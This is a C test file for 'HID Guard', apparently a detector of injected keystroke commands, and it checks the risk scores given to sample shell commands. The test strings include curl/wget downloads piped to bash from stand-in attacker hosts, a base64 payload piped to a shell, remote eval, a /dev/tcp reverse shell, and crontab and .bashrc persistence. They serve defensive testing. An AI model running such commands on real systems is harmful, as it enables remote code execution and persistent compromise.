#include <stdio.h>
#include <string.h>
#include "../daemon/detector.h"
#include "../daemon/input_handler.h"

#define GREEN "\033[32m"
#define RED "\033[31m"
#define YELLOW "\033[33m"
#define RESET "\033[0m"

void test_command(struct detector_state *state, struct device_info *device, const char *description, const char *command, int expected_score) {
    printf("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
    printf("TEST: %s\n", description);
    printf("Command: %s\n", command);

    detector_analyze_command(state, device, command);

    if (state->current_score == expected_score) {
        printf(GREEN "✓ PASS" RESET " - Score: %d (expected %d)\n", state->current_score, expected_score);
    } else {
        printf(RED "✗ FAIL" RESET " - Score: %d (expected %d)\n", state->current_score, expected_score);
    }
}

int main(void) {
    struct detector_state detector;
    detector_init(&detector);

    // Create mock device_info for testing
    struct device_info mock_device;
    memset(&mock_device, 0, sizeof(struct device_info));
    mock_device.path = "/dev/input/event-test";
    mock_device.ikt_count = 0;  // No timing samples (no timing-based alerts)
    strcpy(mock_device.product, "Test Device");

    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║         HID Guard Pattern Detection - Automated Tests           ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");

    // Test 1: Legitimate command
    test_command(&detector, &mock_device, "Legitimate Command",
                 "ls -al /home/rylan",
                 0);

    // Test 2: Simple download
    test_command(&detector, &mock_device, "Download Command (curl)",
                 "curl http://example.com/file.txt",
                 20);  // 2.0 × 1.0 × 10 = 20

    // Test 3: wget download
    test_command(&detector, &mock_device, "Download Command (wget)",
                 "wget http://example.com/file.zip",
                 20);  // 2.0 × 1.0 × 10 = 20

    // Test 4: Piped download (like Docker/Rust installers - legitimate pattern!)
    test_command(&detector, &mock_device, "Piped Download (like curl https://get.docker.com | sh)",
                 "curl http://malicious.com/payload.sh | bash",
                 50);  // 5.0 × 1.0 × 10 = 50

    // Test 5: Piped download variant
    test_command(&detector, &mock_device, "wget Piped to Shell",
                 "wget -O- http://bad.com/script.sh | sh",
                 50);  // 5.0 × 1.0 × 10 = 50

    // Test 6: Base64 decode without piping
    test_command(&detector, &mock_device, "Base64 Decode (benign - no pipe to shell)",
                 "echo ZWNobyBtYWxpY2lvdXMK | base64 -d",
                 0);

    // Test 7: Base64 decode with piping to shell
    test_command(&detector, &mock_device, "Base64 Decode Obfuscation (piped to bash)",
                 "echo ZWNobyBtYWxpY2lvdXMK | base64 -d | bash",
                 65);  // 6.5 × 1.0 × 10 = 65

    // Test 8: Eval with command substitution
    test_command(&detector, &mock_device, "Eval Command Substitution",
                 "eval $(curl http://attacker.com/cmd)",
                 80);  // 8.0 × 1.0 × 10 = 80

    // Test 9: Reverse shell
    test_command(&detector, &mock_device, "Reverse Shell Pattern",
                 "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                 150);

    // Test 10: Chmod + execute
    test_command(&detector, &mock_device, "Execution Pattern",
                 "chmod +x malware.sh && ./malware.sh",
                 30);  // 3.0 × 1.0 × 10 = 30

    // Test 11: Crontab persistence
    test_command(&detector, &mock_device, "Crontab Persistence",
                 "crontab -e",
                 70);  // 7.0 × 1.0 × 10 = 70

    // Test 12: Bashrc persistence
    test_command(&detector, &mock_device, "Bashrc Persistence",
                 "echo malicious code >> ~/.bashrc",
                 70);  // 7.0 × 1.0 × 10 = 70

    // Test 13: Command chaining
    test_command(&detector, &mock_device, "Excessive Command Chaining",
                 "cat file | grep pattern | sed 's/a/b/' | awk '{print $1}' | sort",
                 25);  // 2.5 × 1.0 × 10 = 25

    // Test 14: Complex attack chain (without fast timing)
    // Highest severity: persistence (7.0)
    test_command(&detector, &mock_device, "Full Attack Chain (no timing)",
                 "curl http://evil.com/payload.sh | bash && chmod +x backdoor && ./backdoor && echo persist >> ~/.bashrc",
                 70);  // persistence (7.0) wins, floor enforced

    // Test 15: Multi-stage attack (without fast timing)
    // Highest severity: persistence (7.0)
    test_command(&detector, &mock_device, "Multi-Stage Attack (no timing)",
                 "wget http://attacker.com/script.sh && chmod +x script.sh && ./script.sh && crontab -e",
                 70);  // persistence (7.0) wins, floor enforced

    printf(YELLOW "\n\nTesting complete!\n");

    return 0;
}
